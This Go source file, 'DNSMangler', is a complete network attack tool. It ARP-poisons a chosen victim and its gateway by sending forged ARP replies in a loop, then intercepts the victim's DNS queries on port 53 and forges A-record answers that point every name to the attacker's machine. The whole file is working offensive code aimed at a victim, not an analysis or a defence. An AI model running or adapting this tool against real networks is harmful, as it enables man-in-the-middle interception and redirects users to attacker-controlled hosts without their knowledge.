package main;
/* main.go
	PROGRAM: DNSMangler
	AUTHOR: Ramzi Chennafi
	DATE: November 5 2015
	FUNCTIONS:
		main()
		arpPoison(targetMAC, gateway, gatewayMAC string)
		writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet)
		mangleDNS()
		craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte

	ABOUT:
		main.go is the central code body for the DNSMangler funciton, it contains all functions related to spoofing dns.

	USAGE:
		Type --help for info about the arguments to spoof with.
*/
import(
	"flag"
	"fmt"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/google/gopacket"
	"net"
	"time"
)
var (
	err            error;
	handle         *pcap.Handle;
	ipAddr         net.IP;
	macAddr        net.HardwareAddr;
	target         string
)
/*
    FUNCTION: main()
    RETURNS: Nothing
    ARGUMENTS: None
    ABOUT:
    Grabs incoming arguments and activates the ARP poisoning thread and the DNS spoofing functionality.
		Also grabs host addresses for use later on and sets global variables.
*/
func main(){

	targetPtr := flag.String("targ", "127.0.0.1", "The address of the host for spoofing.");
	targetMAC := flag.String("targm", "FF:FF:FF:FF:FF:FF", "The target mac address.");
	interfacePtr := flag.String("iface", "eth0", "The interface for the backdoor to monitor for incoming connection, defaults to eth0.");
	gatewayPtr := flag.String("gw", "127.0.0.1", "Sets the gateway to poison.");
	gatewayMAC := flag.String("gwm", "FF:FF:FF:FF:FF:FF", "Sets the gateway MAC address.");

	flag.Parse();

	fmt.Print("Welcome to the DNSMangler!\n");
	handle, err = pcap.OpenLive(*interfacePtr, 1600, false, pcap.BlockForever);
	checkError(err)

	err = handle.SetBPFFilter("dst port 53")
	checkError(err);

	defer handle.Close()

	macAddr, ipAddr = grabAddresses(*interfacePtr)
	target = *targetPtr

	go arpPoison(*targetMAC, *gatewayPtr, *gatewayMAC);
	mangleDNS();
}
/*
    FUNCTION: arpPoison(targetMAC, gateway, gatewayMAC string){
    RETURNS: Nothing
    ARGUMENTS:
                string targetMAC - the victim mac address for spoofing
								string gateway - the gateway IP the victim uses
								string gatewayMAC - the mac address of the gateway the vicitim uses

    ABOUT:
    Performs arp poisoning of the target machine. Sets its traffic to all come
		through the host machine, and sets the gateway to redirect its traffic for the victim to this host.
*/
func arpPoison(targetMAC, gateway, gatewayMAC string){

	// i lost my mind over this, the parseip function is broke and adds a bucket of worthless
	// bytes to the beginning of the array, I wish I did this in C
	// I GUESS I DID C
	gw := (net.ParseIP(gateway))[12:]
	tg := (net.ParseIP(target))[12:]
	tgm, _ := net.ParseMAC(targetMAC)
	gwm, _ := net.ParseMAC(gatewayMAC)

	fmt.Print("========================")
	fmt.Printf("GateWay IP:%s\nTarget IP:%s\nGateway MAC:%s\nTarget MAC:%s\n", gateway, target, gatewayMAC, targetMAC)
	fmt.Print("========================")

	ethernetPacket := layers.Ethernet{}
	ethernetPacket.DstMAC = tgm
	ethernetPacket.SrcMAC = macAddr
	ethernetPacket.EthernetType = layers.EthernetTypeARP

	arpPacket := layers.ARP{}
	arpPacket.AddrType = layers.LinkTypeEthernet
	arpPacket.Protocol = 0x0800
	arpPacket.HwAddressSize = 6
	arpPacket.ProtAddressSize = 4
	arpPacket.Operation = 2

	//poison the target
	arpPacket.SourceHwAddress = macAddr
	arpPacket.SourceProtAddress = gw
	arpPacket.DstHwAddress = tgm
	arpPacket.DstProtAddress = tg

	gwEthernetPacket := ethernetPacket
	gwARPPacket := arpPacket;

	//poison the gateway
	gwARPPacket.SourceProtAddress = tg
	gwARPPacket.DstHwAddress = gwm
	gwARPPacket.DstProtAddress = gw

	for {
		//poison target
		writePoison(arpPacket, ethernetPacket)
		time.Sleep(1 * time.Second)
		//poison gateway
		writePoison(gwARPPacket, gwEthernetPacket)
		time.Sleep(5 * time.Second)
	}

}
/*
    FUNCTION: writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
    RETURNS: Nothing
    ARGUMENTS:
                *layers.ARP arpPacket - the arp packet to write to the line
                *layers.Ethernet etherPacket - the ethernet packet to write to the line

    ABOUT:
    Actually writes the arp and ethernet packets used in poisoning to the global handle.
*/
func writePoison(arpPacket layers.ARP, etherPacket layers.Ethernet){
	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{};

	gopacket.SerializeLayers(buf, opts, &etherPacket, &arpPacket);
	packetData := buf.Bytes();

	err := handle.WritePacketData(packetData[:42]);
	checkError(err);
}
/*
    FUNCTION: mangleDNS(){
    RETURNS: Nothing
    ARGUMENTS: None
    ABOUT:
    Performs the DNS spoofing against the victims machine. Sets all dns traffic to redirect to the host
		machines IP address.
*/
func mangleDNS(){

	var ethernetLayer layers.Ethernet
	var ipLayer       layers.IPv4
	var dnsLayer      layers.DNS
	var udpLayer      layers.UDP

	decoder := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &ethernetLayer, &ipLayer, &udpLayer, &dnsLayer)
	decoded := make([]gopacket.LayerType, 0, 4)

	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
	for {
		packet, err := packetSource.NextPacket()
		checkError(err)

		err = decoder.DecodeLayers(packet.Data(), &decoded)
		checkError(err)

		if len(decoded) != 4 {
			fmt.Print("Not enough layers\n")
			continue
		}

		buffer := craftAnswer(&ethernetLayer, &ipLayer, &dnsLayer, &udpLayer)
		if buffer == nil { // if original query was invalid
			fmt.Print("Buffer error, returned nil.\n")
			continue
		}

		err = handle.WritePacketData(buffer);
		checkError(err);
	}
}
/*
    FUNCTION: craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte{
    RETURNS: Byte array containing the spoofed response DNS packet data
    ARGUMENTS:
								*layers.Ethernet ethernetLayer - the ethernet part of the packet recieved
								*layers.DNS dnsLayer - the dns part of the packet recieved
                *layers.IPv4 ipLayer - the ip part of the packet recieved
                *layers.UDP udpLayer - the udp part of the packet recieved

    ABOUT:
    Crafts a spoofed dns packet using the incoming query.
*/
func craftAnswer(ethernetLayer *layers.Ethernet, ipLayer *layers.IPv4, dnsLayer *layers.DNS, udpLayer *layers.UDP) []byte {

	//if not a question return
	if dnsLayer.QR || ipLayer.SrcIP.String() != target {
		return nil;
	}

	//must build every layer to send DNS packets
	ethMac := ethernetLayer.DstMAC
	ethernetLayer.DstMAC = ethernetLayer.SrcMAC
	ethernetLayer.SrcMAC = ethMac

	ipSrc := ipLayer.SrcIP
	ipLayer.SrcIP = ipLayer.DstIP
	ipLayer.DstIP = ipSrc

	srcPort := udpLayer.SrcPort
	udpLayer.SrcPort = udpLayer.DstPort
	udpLayer.DstPort = srcPort
	err = udpLayer.SetNetworkLayerForChecksum(ipLayer)
	checkError(err);

	var answer layers.DNSResourceRecord;
	answer.Type = layers.DNSTypeA
	answer.Class = layers.DNSClassIN
	answer.TTL = 200
	answer.IP = ipAddr

	dnsLayer.QR = true

	for _, q := range dnsLayer.Questions {
		if q.Type != layers.DNSTypeA || q.Class != layers.DNSClassIN {
			continue
		}

		answer.Name = q.Name

		dnsLayer.Answers = append(dnsLayer.Answers, answer)
		dnsLayer.ANCount = dnsLayer.ANCount + 1
	}

	buf := gopacket.NewSerializeBuffer();
	opts := gopacket.SerializeOptions{
		FixLengths: true,
		ComputeChecksums: true,
	};

	err = gopacket.SerializeLayers(buf, opts, ethernetLayer, ipLayer, udpLayer, dnsLayer);
	checkError(err);

	return buf.Bytes()
}
